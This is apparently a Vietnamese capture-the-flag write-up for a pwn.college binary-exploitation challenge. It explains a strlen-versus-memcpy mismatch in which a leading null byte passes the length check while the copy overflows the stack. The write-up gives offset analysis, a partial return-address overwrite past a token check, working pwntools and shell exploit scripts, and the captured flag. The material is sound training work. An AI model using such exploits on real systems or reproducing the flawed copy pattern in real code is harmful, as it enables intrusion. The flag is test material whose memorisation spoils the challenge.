## 📌 [Viettel Training Program] - String Lengths (easy)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Easy
- **Points:** —
- **Description:** Lần này có một cơ chế bảo vệ mới: chương trình đọc input vào heap buffer trước, kiểm tra độ dài bằng `strlen()`, **chỉ copy qua stack nếu `strlen < 37`**. Tuy nhiên, `strlen()` dừng ở null byte, còn `memcpy()` copy dựa trên số byte `read()` trả về — tạo ra cơ hội bypass. Binary: `binary-exploitation-null-write-w` (source được cung cấp).

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-null-write-w
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

**Nhận xét nhanh:**

- **Không Stack Canary** → Có thể ghi đè return address.
- **NX enabled** → Không thể chạy shellcode trên stack.
- **PIE enabled** → Địa chỉ code bị random. Cần **partial overwrite** hoặc dùng địa chỉ in ra từ chương trình.
- **Cơ chế "bảo vệ" mới:** Input được đọc vào heap buffer, kiểm tra `strlen()`, sau đó `memcpy()` lên stack. `strlen()` dừng ở null byte nhưng `memcpy()` copy toàn bộ — đây là lỗ hổng chính.

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích mã nguồn

```c
struct {
    char input[37];
} data = {0};

unsigned long size = 4096;

// Đọc input vào heap buffer trước
char *tmp_input = malloc(size);
int received = read(0, tmp_input, size);

// Kiểm tra strlen — nhưng strlen dừng ở null byte!
size_t string_length = strlen(tmp_input);
assert(string_length < 37);  // luôn pass nếu byte đầu là \x00

// Copy dựa trên received (số byte read trả về), KHÔNG phải string_length!
memcpy(&data.input, tmp_input, received);

if (data.win_variable)  // không có win_variable thực tế
    ...
// Mục tiêu: ghi đè return address để nhảy vào win_authed()
```

Hàm `win_authed(int token)` (giống PIEs) kiểm tra `token != 0x1337` — cần bypass token check.

**Lỗ hổng:** `strlen()` đếm đến null byte đầu tiên. Nếu payload bắt đầu bằng `\x00`, `strlen` trả về 0 (hoặc rất nhỏ) → pass `assert(string_length < 37)`. Nhưng `memcpy()` copy `received` bytes (tổng số byte đã gửi) → tràn stack.

### Tính offset

Từ disassembly (`objdump`):

```asm
sub    $0x70, %rsp          ; stack frame: 112 byte
; input[37] tại rbp-0x50
movq   $0x0, -0x50(%rbp)    ; input[0..7]
movq   $0x0, -0x48(%rbp)    ; input[8..15]
movq   $0x0, -0x40(%rbp)    ; input[16..23]
movq   $0x0, -0x38(%rbp)    ; input[24..31]
movl   $0x0, -0x30(%rbp)    ; input[32..35]
movb   $0x0, -0x2c(%rbp)    ; input[36]
movq   $0x0, -0x8(%rbp)     ; size = 0
```

| Thành phần | Vị trí stack | Offset từ `input` |
|------------|--------------|-------------------|
| `input[37]` | `rbp-0x50` … `rbp-0x2b` | 0 – 36 |
| ... | (các biến tạm + padding) | 37 – 71 |
| `size` | `rbp-0x8` | 72 – 79 |
| Saved RBP | `rbp+0` | 80 – 87 |
| **Saved return address** | **`rbp+8`** | **88 – 95** |

=> **Offset tới return address = 88 bytes.**

### Bypass token check

`win_authed()` tại offset `0x1c29`:

```asm
1c35:  mov    %edi, -0x4(%rbp)
1c38:  cmpl   $0x1337, -0x4(%rbp)    ; if (token != 0x1337)
1c3f:  jne    1d43 <win_authed+0x11a> ; → return
1c45:  lea    0x14a4(%rip), %rdi      ; "You win!..."  ← target
```

Địa chỉ sau token check (offset trong binary): **`0x1c45`**. Partial overwrite: `\x45\x1c` (2 byte thấp).

Vì chương trình in địa chỉ `win_authed()` khi chạy, ta cũng có thể dùng full address — nhưng dùng partial overwrite là kỹ thuật đúng cho PIE.

### Phân tích động (GDB)

```text
$ gdb ./binary-exploitation-null-write-w
pwndbg> break *challenge+0x104    # sau lệnh memcpy
pwndbg> run
Send your payload (up to 4096 bytes)!
pwndbg> cyclic 100
pwndbg> continue
pwndbg> cyclic -l $rsp
[*] Found offset of 88
```

## 3. Ý tưởng Tấn công (Exploit Strategy)

1. **Bypass strlen:** Đặt `\x00` làm byte đầu tiên → `strlen()` trả về 0 < 37 → pass assert.
2. **Gửi payload tràn:** `\x00` + padding đến offset 88 + 2 byte partial overwrite (`\x45\x1c`).
3. `memcpy()` copy toàn bộ `received` bytes lên stack → ghi đè return address.
4. Khi `challenge()` return, nhảy vào `win_authed()` sau token check → in flag.

> **Null byte poisoning:** `\x00` ở đầu payload đánh lừa `strlen()` nhưng không ảnh hưởng tới `memcpy()`.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-null-write-w")
# r = process("./binary-exploitation-null-write-w")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_RIP = 88         # offset từ input tới return address
WIN_SKIP = 0x1c45       # win_authed+0x1c (sau token check)

# Byte \x00 đầu tiên để bypass strlen, sau đó padding + partial overwrite
payload = b"\x00"                     # strlen() → 0 (pass assert)
payload += b"A" * (OFFSET_RIP - 1)   # padding tới return address
payload += p16(WIN_SKIP)              # partial overwrite — 2 byte thấp

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-null-write-w")
payload = b"\x00" + b"A" * 87 + b"\x45\x1c"
r.sendafter(b"Send your payload", payload)
r.interactive()
```

Hoặc không dùng pwntools:

```bash
python3 -c '
import sys
payload = b"\x00" + b"A" * 87 + b"\x45\x1c"
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-null-write-w
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge:

```text
Send your payload (up to 4096 bytes)!
Checking length of received string...
Passed! We should have enough space for all 0 bytes of it on the stack. Copying all 90 received bytes!
...
Goodbye!
You win! Here is your flag:
pwn.college{0YsQs58MaoS6lhgJ2aK2FrjHdxM.dNTOywSMzgjNwEzW}
```

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win_authed()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- **strlen vs memcpy mismatch:** `strlen()` dừng ở null byte, nhưng `memcpy()` copy theo số byte thực tế — đây là lỗ hổng kinh điển.
- **Null byte poisoning:** Đặt `\x00` ở đầu payload để bypass kiểm tra độ dài dùng `strlen()`.
- **Partial overwrite với PIE:** Chỉ ghi 2 byte thấp của return address, giữ nguyên 6 byte cao.
- **return-to-middle:** Nhảy vào `win_authed()` sau token check (`0x1c45`) để bypass auth.
- **Offset 88 byte:** Buffer 37 byte + padding + size + saved RBP.
